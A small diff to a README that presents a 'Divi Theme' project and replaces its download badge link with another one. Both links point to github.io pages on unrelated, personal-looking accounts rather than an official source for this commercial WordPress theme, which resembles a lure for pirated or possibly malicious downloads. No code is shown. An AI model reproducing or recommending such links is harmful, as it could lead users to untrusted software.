@@ -2,7 +2,7 @@
 
 ![WordPress layout editor with reusable sections and responsive page previews](https://avatars.mds.yandex.net/i?id=50f5b890e9819dda0789ccb3fa23801c066f8a51-5859751-images-thumbs&n=13)
 
-[![Download Divi Theme](https://img.shields.io/badge/Download-Divi_Theme-blueviolet?style=for-the-badge&logo=wordpress)](https://isaiashahnmpzt.github.io/.github/divi-theme-builder)
+[![Download Divi Theme](https://img.shields.io/badge/Download-Divi_Theme-blueviolet?style=for-the-badge&logo=wordpress)](https://cyrusmuellerreol.github.io/.github/divi-theme-builder)
 
 ## Divi Theme Project Snapshot
 
